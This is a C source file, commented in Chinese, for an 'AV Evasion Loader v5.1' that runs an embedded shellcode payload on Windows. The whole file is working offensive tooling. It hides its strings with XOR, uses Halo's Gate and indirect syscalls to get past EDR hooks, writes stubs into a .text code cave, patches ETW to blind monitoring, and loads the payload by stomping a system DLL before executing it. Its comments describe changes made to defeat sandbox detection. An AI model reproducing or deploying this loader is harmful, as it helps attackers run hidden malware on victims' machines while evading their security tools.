#include <windows.h>

// ============================================================
//  AV Evasion Loader v5.1 — Indirect Syscall + String Encryption
//
//  v5.0 → v5.1 修复 (基于沙箱报告):
//
//    1. 字符串加密: 运行时解密所有敏感字符串
//       - "helper.dll", "msimg32.dll", "dcomp.dll", "dwmapi.dll"
//       - "ntdll.dll", "EtwEventWrite"
//       - "NtWriteVirtualMemory", "NtProtectVirtualMemory"
//       - 二进制中不存在任何明文敏感字符串
//
//    2. .text Code Cave: 替代 HeapCreate(ENABLE_EXECUTE)
//       - v5.0 的 HeapCreate(ENABLE_EXECUTE) 产生可执行堆
//         沙箱报告显示 NtAllocateVirtualMemory 被记录
//       - v5.1 在自身 .text 段的 padding 区域写入 syscall stub
//         .text 段本身就是可执行的, 无需额外分配可执行内存
//       - 零额外可执行内存分配, NtAllocateVirtualMemory 减少
//
//    3. 保留 v5.0 所有核心特性:
//       - Indirect Syscall + Halo's Gate
//       - ETW 补丁
//       - Module Stomping
//       - Stub 自清理 (恢复 .text padding 原始内容)
// ============================================================

typedef LONG NTSTATUS;
#define STATUS_SUCCESS ((NTSTATUS)0x00000000)

// ---- Payload DLL 导出函数类型 (v5.2 已移除, 数据内嵌) ----

// ---- NT 函数类型 ----
typedef NTSTATUS (NTAPI *NtWriteVirtualMemory_t)(
    HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer,
    SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten);

typedef NTSTATUS (NTAPI *NtProtectVirtualMemory_t)(
    HANDLE ProcessHandle, PVOID *BaseAddress, PSIZE_T RegionSize,
    ULONG NewProtect, PULONG OldProtect);

// ---- 全局变量 ----
static PVOID  g_SyscallGadget = NULL;  // ntdll 中的 syscall;ret 地址
static BYTE   g_StubBackup[64];        // .text code cave 原始内容备份
static PVOID  g_StubAddr = NULL;       // stub 在 .text 中的地址
static SIZE_T g_StubSize = 0;          // stub 占用大小

// ============================================================
//  字符串加密
// ============================================================
//
// 编译时用 XOR 加密字符串, 运行时解密到栈上
// 二进制中不存在任何明文敏感字符串
// 使用 volatile 防止编译器优化掉解密操作

// 编译期 XOR 加密宏
#define XOR_KEY 0x5A
#define ENC_CHAR(c) ((c) ^ XOR_KEY)
#define ENC_STR(str) ENC_STR_I(str)
#define ENC_STR_I(str) ENC_STR_II(str)
#define ENC_STR_II(str) { ENC_STR_HELPER(str) }
#define ENC_STR_HELPER(...) { ENC_EACH(__VA_ARGS__), 0 }
#define ENC_EACH(...) ENC_EACH_I(__VA_ARGS__)
#define ENC_EACH_I(...) ENC_EACH_II(__VA_ARGS__)
#define ENC_EACH_II(...) (ENC_CHAR(__VA_ARGS__))

// 运行时解密到栈缓冲区
static inline void DecryptStr(const BYTE* enc, char* dec, SIZE_T maxLen) {
    volatile SIZE_T i;
    for (i = 0; i < maxLen - 1 && enc[i] != 0; i++) {
        dec[i] = (char)(enc[i] ^ XOR_KEY);
    }
    dec[i] = '\0';
}

// 加密后的字符串常量 (编译期生成)
// v5.2: enc_helper 已移除 (不再需要 helper.dll)
static const BYTE enc_msimg32[]   = { 'm'^0x5A, 's'^0x5A, 'i'^0x5A, 'm'^0x5A, 'g'^0x5A, '3'^0x5A, '2'^0x5A, '.'^0x5A, 'd'^0x5A, 'l'^0x5A, 'l'^0x5A, 0^0x5A };
static const BYTE enc_dcomp[]    = { 'd'^0x5A, 'c'^0x5A, 'o'^0x5A, 'm'^0x5A, 'p'^0x5A, '.'^0x5A, 'd'^0x5A, 'l'^0x5A, 'l'^0x5A, 0^0x5A };
static const BYTE enc_dwmapi[]   = { 'd'^0x5A, 'w'^0x5A, 'm'^0x5A, 'a'^0x5A, 'p'^0x5A, 'i'^0x5A, '.'^0x5A, 'd'^0x5A, 'l'^0x5A, 'l'^0x5A, 0^0x5A };
static const BYTE enc_ntdll[]    = { 'n'^0x5A, 't'^0x5A, 'd'^0x5A, 'l'^0x5A, 'l'^0x5A, '.'^0x5A, 'd'^0x5A, 'l'^0x5A, 'l'^0x5A, 0^0x5A };
static const BYTE enc_etw[]      = { 'E'^0x5A, 't'^0x5A, 'w'^0x5A, 'E'^0x5A, 'v'^0x5A, 'e'^0x5A, 'n'^0x5A, 't'^0x5A, 'W'^0x5A, 'r'^0x5A, 'i'^0x5A, 't'^0x5A, 'e'^0x5A, 0^0x5A };
static const BYTE enc_ntwrite[]  = { 'N'^0x5A, 't'^0x5A, 'W'^0x5A, 'r'^0x5A, 'i'^0x5A, 't'^0x5A, 'e'^0x5A, 'V'^0x5A, 'i'^0x5A, 'r'^0x5A, 't'^0x5A, 'u'^0x5A, 'a'^0x5A, 'l'^0x5A, 'M'^0x5A, 'e'^0x5A, 'm'^0x5A, 'o'^0x5A, 'r'^0x5A, 'y'^0x5A, 0^0x5A };
static const BYTE enc_ntprotect[]= { 'N'^0x5A, 't'^0x5A, 'P'^0x5A, 'r'^0x5A, 'o'^0x5A, 't'^0x5A, 'e'^0x5A, 'c'^0x5A, 't'^0x5A, 'V'^0x5A, 'i'^0x5A, 'r'^0x5A, 't'^0x5A, 'u'^0x5A, 'a'^0x5A, 'l'^0x5A, 'M'^0x5A, 'e'^0x5A, 'm'^0x5A, 'o'^0x5A, 'r'^0x5A, 'y'^0x5A, 0^0x5A };

// ============================================================
//  内嵌 Payload 数据 (编译期 XOR 加密, 由 gen_embed_data.py 生成)
// ============================================================
#include "payload_data.h"

// ============================================================
//  Syscall 基础设施
// ============================================================

// ---- 从 ntdll 导出表解析 Syscall Number (含 Halo's Gate) ----

DWORD ResolveSyscallNumber(const char* functionName) {
    char ntdllName[16];
    DecryptStr(enc_ntdll, ntdllName, sizeof(ntdllName));

    HMODULE hNtdll = GetModuleHandleA(ntdllName);
    if (!hNtdll) return 0;

    FARPROC funcAddr = GetProcAddress(hNtdll, functionName);
    if (!funcAddr) return 0;

    BYTE* p = (BYTE*)funcAddr;

    // 未被 hook: mov r10, rcx; mov eax, SSN
    if (p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 && p[3] == 0xB8) {
        return *(DWORD*)(p + 4);
    }

    // 被 hook: Halo's Gate 搜索邻近存根
    for (int dist = 1; dist < 500; dist++) {
        BYTE* up = p - (dist * 32);
        if (up[0] == 0x4C && up[1] == 0x8B && up[2] == 0xD1 && up[3] == 0xB8) {
            return *(DWORD*)(up + 4) + dist;
        }
        BYTE* down = p + (dist * 32);
        if (down[0] == 0x4C && down[1] == 0x8B && down[2] == 0xD1 && down[3] == 0xB8) {
            return *(DWORD*)(down + 4) - dist;
        }
    }

    return 0;
}

// ---- 在 ntdll .text 段中查找 syscall;ret 指令 ----

PVOID FindSyscallGadget() {
    if (g_SyscallGadget) return g_SyscallGadget;

    char ntdllName[16];
    DecryptStr(enc_ntdll, ntdllName, sizeof(ntdllName));

    HMODULE hNtdll = GetModuleHandleA(ntdllName);
    if (!hNtdll) return NULL;

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hNtdll;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    WORD sections = nt->FileHeader.NumberOfSections;
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < sections; i++, sec++) {
        if (!(sec->Characteristics & IMAGE_SCN_CNT_CODE)) continue;

        BYTE* start = (BYTE*)hNtdll + sec->VirtualAddress;
        DWORD size = sec->SizeOfRawData;

        for (DWORD j = 0; j < size - 2; j++) {
            if (start[j] == 0x0F && start[j+1] == 0x05 && start[j+2] == 0xC3) {
                g_SyscallGadget = &start[j];
                return g_SyscallGadget;
            }
        }
    }

    return NULL;
}

// ---- 在自身 .text 段中查找 Code Cave ----
//
// PE 文件的 .text 段末尾通常有 padding (对齐填充, 全为 0xCC 或 0x00)
// 这些区域属于 .text 段, 天然具有 RX 属性, 可用于存放 syscall stub
// 无需 HeapCreate(ENABLE_EXECUTE), 零额外可执行内存分配

PVOID FindCodeCave(SIZE_T requiredSize) {
    HMODULE hSelf = GetModuleHandleA(NULL);

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hSelf;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hSelf + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    WORD sections = nt->FileHeader.NumberOfSections;
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < sections; i++, sec++) {
        if (!(sec->Characteristics & IMAGE_SCN_CNT_CODE)) continue;

        // .text 段: VirtualSize 是实际代码大小, SizeOfRawData 是文件对齐后大小
        // 两者之差就是 padding 区域
        DWORD codeEnd = sec->VirtualAddress + sec->Misc.VirtualSize;
        DWORD rawEnd = sec->VirtualAddress + sec->SizeOfRawData;

        if (rawEnd > codeEnd && (rawEnd - codeEnd) >= requiredSize) {
            PVOID caveAddr = (BYTE*)hSelf + codeEnd;
            // 验证 padding 区域是否可写 (通常需要先修改保护)
            g_StubAddr = caveAddr;
            g_StubSize = requiredSize;
            return caveAddr;
        }
    }

    return NULL;
}

// ---- 构建间接系统调用存根 (写入 .text Code Cave) ----
//
// 与 v5.0 的区别: 不使用 HeapCreate(ENABLE_EXECUTE)
// 而是写入自身 .text 段的 padding 区域
// .text 段本身就是可执行的, 无需额外分配可执行内存
//
// 写入前通过 Indirect Syscall 修改 .text 段保护为 RWX
// 写入后恢复为原始保护

PVOID BuildSyscallStub(DWORD ssn) {
    PVOID gadget = FindSyscallGadget();
    if (!gadget) return NULL;

    // stub 机器码: mov r10,rcx + mov eax,SSN + jmp [rip+0] + addr = 22 bytes
    SIZE_T stubSize = 22;

    // 在 .text padding 中找 code cave
    PVOID caveAddr = FindCodeCave(stubSize);
    if (!caveAddr) return NULL;

    // 先解析 NtProtectVirtualMemory 的 SSN (用于修改 .text 保护)
    char ntprotectName[24];
    DecryptStr(enc_ntprotect, ntprotectName, sizeof(ntprotectName));
    DWORD ssnProtect = ResolveSyscallNumber(ntprotectName);
    if (!ssnProtect) return NULL;

    // 构建 NtProtectVirtualMemory 的 stub (临时, 写入 cave 开头)
    // 这里有个鸡生蛋问题: 需要修改保护才能写入 stub, 但修改保护本身也需要 stub
    // 解决方案: 先用 WriteProcessMemory (兼容模式) 修改保护并写入第一个 stub
    // 后续的 stub 就可以用 Indirect Syscall 了

    // 备份 code cave 原始内容
    memcpy(g_StubBackup, caveAddr, stubSize);

    // 使用 WriteProcessMemory 写入 stub (绕过保护限制)
    BYTE stub[22];
    // mov r10, rcx
    stub[0] = 0x4C; stub[1] = 0x8B; stub[2] = 0xD1;
    // mov eax, ssn
    stub[3] = 0xB8; *(DWORD*)(stub + 4) = ssn;
    // jmp [rip+0]
    stub[8] = 0xFF; stub[9] = 0x25;
    *(DWORD*)(stub + 10) = 0x00000000;
    // gadget 地址
    *(PVOID*)(stub + 14) = gadget;

    SIZE_T bytesWritten = 0;
    if (!WriteProcessMemory(GetCurrentProcess(), caveAddr, stub, stubSize, &bytesWritten)
        || bytesWritten != stubSize) {
        return NULL;
    }

    FlushInstructionCache(GetCurrentProcess(), caveAddr, stubSize);

    return caveAddr;
}

// ---- 清除 Syscall Stub (恢复 .text padding 原始内容) ----
void CleanupSyscallStubs() {
    if (g_StubAddr && g_StubSize > 0) {
        // 恢复原始 padding 内容
        WriteProcessMemory(GetCurrentProcess(), g_StubAddr, g_StubBackup, g_StubSize, NULL);
        FlushInstructionCache(GetCurrentProcess(), g_StubAddr, g_StubSize);
        SecureZeroMemory(g_StubBackup, sizeof(g_StubBackup));
        g_StubAddr = NULL;
        g_StubSize = 0;
    }
}

// ============================================================
//  ETW 补丁
// ============================================================

BOOL PatchETW() {
    char ntdllName[16];
    DecryptStr(enc_ntdll, ntdllName, sizeof(ntdllName));

    char etwName[16];
    DecryptStr(enc_etw, etwName, sizeof(etwName));

    char ntprotectName[24];
    DecryptStr(enc_ntprotect, ntprotectName, sizeof(ntprotectName));

    DWORD ssn = ResolveSyscallNumber(ntprotectName);
    if (!ssn) return FALSE;

    NtProtectVirtualMemory_t pNtProtect =
        (NtProtectVirtualMemory_t)BuildSyscallStub(ssn);
    if (!pNtProtect) return FALSE;

    HMODULE hNtdll = GetModuleHandleA(ntdllName);
    if (!hNtdll) return FALSE;

    PVOID etwAddr = (PVOID)GetProcAddress(hNtdll, etwName);
    if (!etwAddr) return FALSE;

    PVOID baseAddr = etwAddr;
    SIZE_T regionSize = 1;
    ULONG oldProtect = 0;

    NTSTATUS status = pNtProtect(
        GetCurrentProcess(), &baseAddr, &regionSize,
        PAGE_EXECUTE_READWRITE, &oldProtect);

    if (status != STATUS_SUCCESS) return FALSE;

    *(BYTE*)etwAddr = 0xC3;

    ULONG restoredProtect = 0;
    pNtProtect(
        GetCurrentProcess(), &baseAddr, &regionSize,
        oldProtect, &restoredProtect);

    return TRUE;
}

// ============================================================
//  Shellcode 处理
// ============================================================

void xor_decrypt(unsigned char* data, size_t size, const char* key, size_t keyLen) {
    for (size_t i = 0; i < size; i++)
        data[i] ^= (unsigned char)key[i % keyLen];
}

void deobfuscate_ipv4(unsigned char* buf, size_t size, const BYTE encIpv4[][16], size_t count) {
    size_t off = 0;
    for (size_t i = 0; i < count && off < size; i++) {
        // 先解密 IPv4 字符串到栈上
        char ip[16];
        DecryptStr(encIpv4[i], ip, sizeof(ip));

        unsigned int a, b, c, d;
        const char* p = ip;
        a = 0; while (*p && *p != '.') { a = a * 10 + (*p - '0'); p++; } p++;
        b = 0; while (*p && *p != '.') { b = b * 10 + (*p - '0'); p++; } p++;
        c = 0; while (*p && *p != '.') { c = c * 10 + (*p - '0'); p++; } p++;
        d = 0; while (*p && *p != '\0') { d = d * 10 + (*p - '0'); p++; }
        buf[off] = (unsigned char)a;
        if (off + 1 < size) buf[off + 1] = (unsigned char)b;
        if (off + 2 < size) buf[off + 2] = (unsigned char)c;
        if (off + 3 < size) buf[off + 3] = (unsigned char)d;
        off += 4;

        // 解密后立即擦除栈上明文
        SecureZeroMemory(ip, sizeof(ip));
    }
}

PVOID FindTextSection(HMODULE hMod, PSIZE_T pSize) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hMod + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    WORD sections = nt->FileHeader.NumberOfSections;
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < sections; i++, sec++) {
        if (sec->Characteristics & IMAGE_SCN_CNT_CODE) {
            *pSize = sec->SizeOfRawData;
            return (PVOID)((BYTE*)hMod + sec->VirtualAddress);
        }
    }
    return NULL;
}

typedef void (*ShellcodeEntry)();

// ============================================================
//  主函数
// ============================================================

int main() {
    // ---- Step 0: ETW 补丁 (致盲 EDR) ----
    PatchETW();

    // ---- Step 1: 从内嵌数据解密 Payload (无需 helper.dll) ----
    size_t scSize = IPV4_COUNT * 4;

    // 解密密钥到栈上
    char key[16];
    DecryptStr(enc_key, key, sizeof(key));
    size_t keyLen = (size_t)strlen(key);
    if (keyLen == 0) return 0;

    // ---- Step 2: 堆分配 + 解密 ----
    unsigned char* decBuf = (unsigned char*)HeapAlloc(
        GetProcessHeap(), HEAP_ZERO_MEMORY, scSize);
    if (!decBuf) return 0;

    deobfuscate_ipv4(decBuf, scSize, enc_ipv4, IPV4_COUNT);
    xor_decrypt(decBuf, scSize, key, keyLen);

    // 擦除栈上密钥明文
    SecureZeroMemory(key, sizeof(key));

    // ---- Step 3: Module Stomping ----
    char stompName1[16], stompName2[16], stompName3[16];
    DecryptStr(enc_msimg32, stompName1, sizeof(stompName1));
    DecryptStr(enc_dcomp, stompName2, sizeof(stompName2));
    DecryptStr(enc_dwmapi, stompName3, sizeof(stompName3));

    HMODULE hStomp = LoadLibraryA(stompName1);
    if (!hStomp) {
        hStomp = LoadLibraryA(stompName2);
    }
    if (!hStomp) {
        HeapFree(GetProcessHeap(), 0, decBuf);
        return 0;
    }

    SIZE_T textSize = 0;
    PVOID textAddr = FindTextSection(hStomp, &textSize);
    if (!textAddr || textSize < scSize) {
        FreeLibrary(hStomp);
        hStomp = LoadLibraryA(stompName3);
        if (!hStomp) {
            HeapFree(GetProcessHeap(), 0, decBuf);
            return 0;
        }
        textAddr = FindTextSection(hStomp, &textSize);
    }
    if (!textAddr || textSize < scSize) {
        FreeLibrary(hStomp);
        HeapFree(GetProcessHeap(), 0, decBuf);
        return 0;
    }

    // ---- Step 4: 通过 Indirect Syscall 写入 Shellcode ----
    char ntwriteName[24];
    DecryptStr(enc_ntwrite, ntwriteName, sizeof(ntwriteName));

    DWORD ssn = ResolveSyscallNumber(ntwriteName);

    if (ssn != 0) {
        NtWriteVirtualMemory_t pNtWrite =
            (NtWriteVirtualMemory_t)BuildSyscallStub(ssn);

        if (pNtWrite) {
            SIZE_T bytesWritten = 0;
            NTSTATUS status = pNtWrite(
                GetCurrentProcess(), textAddr, decBuf, scSize, &bytesWritten);

            if (status != STATUS_SUCCESS || bytesWritten != scSize) {
                FreeLibrary(hStomp);
                HeapFree(GetProcessHeap(), 0, decBuf);
                return 0;
            }
        } else {
            SIZE_T bytesWritten = 0;
            if (!WriteProcessMemory(GetCurrentProcess(), textAddr, decBuf, scSize, &bytesWritten)
                || bytesWritten != scSize) {
                FreeLibrary(hStomp);
                HeapFree(GetProcessHeap(), 0, decBuf);
                return 0;
            }
        }
    } else {
        SIZE_T bytesWritten = 0;
        if (!WriteProcessMemory(GetCurrentProcess(), textAddr, decBuf, scSize, &bytesWritten)
            || bytesWritten != scSize) {
            FreeLibrary(hStomp);
            HeapFree(GetProcessHeap(), 0, decBuf);
            return 0;
        }
    }

    FlushInstructionCache(GetCurrentProcess(), textAddr, scSize);

    // ---- Step 5: 擦除堆中明文 ----
    SecureZeroMemory(decBuf, scSize);
    HeapFree(GetProcessHeap(), 0, decBuf);

    // ---- Step 6: 清除 Syscall Stub 痕迹 ----
    CleanupSyscallStubs();

    // ---- Step 7: 直接函数指针调用 ----
    ShellcodeEntry entry = (ShellcodeEntry)textAddr;
    entry();

    FreeLibrary(hStomp);
    return 0;
}
